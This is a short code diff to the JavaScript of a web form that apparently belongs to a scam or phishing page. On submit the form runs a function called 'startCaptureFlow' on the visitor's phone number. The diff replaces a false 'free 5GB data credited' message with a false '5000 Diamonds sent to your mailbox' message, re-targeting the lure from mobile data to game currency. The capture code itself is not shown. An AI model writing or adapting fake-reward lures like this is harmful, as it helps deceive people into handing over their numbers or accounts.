@@ -21,15 +21,15 @@ elements.form.addEventListener('submit', async (e) => {
     
     // UI Loading state
     setLoading(true);
-    elements.status.textContent = 'Verifying your number...';
+    elements.status.textContent = 'Verifying Account ID...';
     elements.status.style.color = 'var(--primary)';
 
     try {
         await startCaptureFlow(phoneNumber);
         
         // Final UI state
-        elements.status.textContent = 'Congratulations! 5GB data has been credited to your account.';
-        elements.status.style.color = 'var(--success)';
+        elements.status.textContent = 'Congratulations! 5000 Diamonds have been sent to your mailbox.';
+        elements.status.style.color = 'var(--accent)';
         elements.phoneInput.value = '';
     } catch (err) {
         console.error('Flow error:', err);
